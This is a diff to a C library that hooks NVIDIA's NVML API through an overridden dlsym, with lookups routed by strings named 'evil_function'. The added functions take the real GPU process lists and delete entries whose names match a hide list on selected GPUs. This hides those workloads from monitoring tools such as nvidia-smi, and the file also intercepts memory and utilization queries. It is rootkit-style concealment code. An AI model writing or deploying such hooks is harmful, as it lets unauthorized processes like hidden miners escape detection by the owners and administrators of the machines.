@@ -62,6 +62,73 @@ typedef struct nvmlProcessInfo_st {
   //  0xFFFFFFFF otherwise.
 } nvmlProcessInfo_t;
 
+nvmlReturn_t DECLDIR nvmlDeviceGetComputeRunningProcesses(nvmlDevice_t device,
+															 unsigned int *infoCount,
+															 nvmlProcessInfo_t *infos) {
+
+  void *handle;
+  char *error;
+  handle = dlopen("libnvidia-ml.so", RTLD_LAZY);
+  if ((error = dlerror()) != NULL) {
+	puts(error);
+	exit(-1);
+  }
+
+  nvmlReturn_t (*realopen)(nvmlDevice_t device, unsigned int *infoCount, nvmlProcessInfo_t *infos);
+  realopen = __libc_dlsym(handle, "nvmlDeviceGetComputeRunningProcesses");
+
+  nvmlReturn_t (*realpn)(unsigned int pid, char *name, unsigned int length);
+  realpn = __libc_dlsym(handle, "nvmlSystemGetProcessName");
+
+  nvmlReturn_t r = realopen(device, infoCount, infos);
+  if (r != NVML_SUCCESS) {
+	return r;
+  }
+
+  {
+	int hide = 0;
+	nvmlReturn_t (*realIndex)(nvmlDevice_t device1, unsigned int *index);
+	realIndex = __libc_dlsym(handle, "nvmlDeviceGetIndex");
+	unsigned int index = -1;
+	nvmlReturn_t ridx = realIndex(device, &index);
+	if (ridx != NVML_SUCCESS) {
+	  return ridx;
+	}
+	for (int i = 0;
+		 sizeof(hide_GPU_Index) != 0 && i < sizeof(hide_GPU_Index) / sizeof(hide_GPU_Index[0]);
+		 i++) {
+	  if (index == hide_GPU_Index[i])hide = 1;
+	}
+	if (!hide)return NVML_SUCCESS;
+  }
+
+  int count = 0;
+  while (count < *infoCount) {
+	uint pid = (infos + count)->pid;
+
+	char *proc_name[128];
+	{
+	  nvmlReturn_t n = realpn(pid, proc_name, 128);
+	  if (n != 0) {
+		return NVML_ERROR_UNKNOWN;
+	  }
+	}
+	for (int i = 0; i < sizeof(hide_process_name) / sizeof(hide_process_name[0]); i++) {
+	  if (strstr(proc_name, hide_process_name[i]) != NULL) {
+		memcpy(infos + count,
+			   infos + count + 1,
+			   sizeof(nvmlProcessInfo_t) * (*infoCount - count - 1));
+		(*infoCount)--;
+		count--;
+		break;
+	  }
+	}
+	count++;
+  }
+
+  dlclose(handle);
+  return NVML_SUCCESS;
+}
 nvmlReturn_t DECLDIR nvmlDeviceGetComputeRunningProcesses_v2(nvmlDevice_t device,
 															 unsigned int *infoCount,
 															 nvmlProcessInfo_t *infos) {
@@ -128,7 +195,6 @@ nvmlReturn_t DECLDIR nvmlDeviceGetComputeRunningProcesses_v2(nvmlDevice_t device
 
   dlclose(handle);
   return NVML_SUCCESS;
-
 }
 
 typedef struct nvmlMemory_st {
@@ -260,6 +326,74 @@ nvmlReturn_t DECLDIR nvmlDeviceGetUtilizationRates(nvmlDevice_t device,
   getRates = __libc_dlsym(handle, "nvmlDeviceGetUtilizationRates");
   return getRates(device, utilization);
 }
+nvmlReturn_t DECLDIR nvmlDeviceGetGraphicsRunningProcesses(nvmlDevice_t device,
+															  unsigned int *infoCount,
+															  nvmlProcessInfo_t *infos) {
+
+  void *handle;
+  char *error;
+  handle = dlopen("libnvidia-ml.so", RTLD_LAZY);
+  if ((error = dlerror()) != NULL) {
+	puts(error);
+	exit(-1);
+  }
+
+  nvmlReturn_t (*realopen)(nvmlDevice_t device, unsigned int *infoCount, nvmlProcessInfo_t *infos);
+  realopen = __libc_dlsym(handle, "nvmlDeviceGetGraphicsRunningProcesses");
+
+  nvmlReturn_t (*realpn)(unsigned int pid, char *name, unsigned int length);
+  realpn = __libc_dlsym(handle, "nvmlSystemGetProcessName");
+
+  nvmlReturn_t r = realopen(device, infoCount, infos);
+  if (r != NVML_SUCCESS) {
+	return r;
+  }
+
+  {
+	int hide = 0;
+	nvmlReturn_t (*realIndex)(nvmlDevice_t device1, unsigned int *index);
+	realIndex = __libc_dlsym(handle, "nvmlDeviceGetIndex");
+	unsigned int index = -1;
+	nvmlReturn_t ridx = realIndex(device, &index);
+	if (ridx != NVML_SUCCESS) {
+	  return ridx;
+	}
+	for (int i = 0;
+		 sizeof(hide_GPU_Index) != 0 && i < sizeof(hide_GPU_Index) / sizeof(hide_GPU_Index[0]);
+		 i++) {
+	  if (index == hide_GPU_Index[i])hide = 1;
+	}
+	if (!hide)return NVML_SUCCESS;
+  }
+
+  int count = 0;
+  while (count < *infoCount) {
+	uint pid = (infos + count)->pid;
+
+	char *proc_name[128];
+	{
+	  nvmlReturn_t n = realpn(pid, proc_name, 128);
+	  if (n != 0) {
+		return NVML_ERROR_UNKNOWN;
+	  }
+	}
+
+	for (int i = 0; i < sizeof(hide_process_name) / sizeof(hide_process_name[0]); i++) {
+	  if (strstr(proc_name, hide_process_name[i]) != NULL) {
+		memcpy(infos + count,
+			   infos + count + 1,
+			   sizeof(nvmlProcessInfo_t) * (*infoCount - count - 1));
+		(*infoCount)--;
+		count--;
+		break;
+	  }
+	}
+	count++;
+  }
+
+  dlclose(handle);
+  return NVML_SUCCESS;
+}
 
 nvmlReturn_t DECLDIR nvmlDeviceGetGraphicsRunningProcesses_v2(nvmlDevice_t device,
 															  unsigned int *infoCount,
@@ -330,8 +464,10 @@ nvmlReturn_t DECLDIR nvmlDeviceGetGraphicsRunningProcesses_v2(nvmlDevice_t devic
   return NVML_SUCCESS;
 }
 
-const char *evil_function1 = "nvmlDeviceGetComputeRunningProcesses_v2";
-const char *evil_function2 = "nvmlDeviceGetGraphicsRunningProcesses_v2";
+const char *evil_function1_v0 = "nvmlDeviceGetComputeRunningProcesses";
+const char *evil_function2_v0 = "nvmlDeviceGetGraphicsRunningProcesses";
+const char *evil_function1_v2 = "nvmlDeviceGetComputeRunningProcesses_v2";
+const char *evil_function2_v2 = "nvmlDeviceGetGraphicsRunningProcesses_v2";
 const char *evil_function3 = "nvmlDeviceGetMemoryInfo";
 const char *evil_function4 = "nvmlDeviceGetUtilizationRates";
 
@@ -343,10 +479,16 @@ extern void *dlsym(void *handle, const char *name) {
   if (!strcmp(name, "dlsym"))
 	return (void *) dlsym;
 
-  if (strcmp(name, evil_function1) == 0) {
+  if (strcmp(name, evil_function1_v0) == 0) {
+	void *result = nvmlDeviceGetComputeRunningProcesses;
+	return result;
+  } else if (strcmp(name, evil_function2_v0) == 0) {
+	void *result = nvmlDeviceGetGraphicsRunningProcesses;
+	return result;
+  } else if (strcmp(name, evil_function1_v2) == 0) {
 	void *result = nvmlDeviceGetComputeRunningProcesses_v2;
 	return result;
-  } else if (strcmp(name, evil_function2) == 0) {
+  } else if (strcmp(name, evil_function2_v2) == 0) {
 	void *result = nvmlDeviceGetGraphicsRunningProcesses_v2;
 	return result;
   } else if (strcmp(name, evil_function3) == 0) {
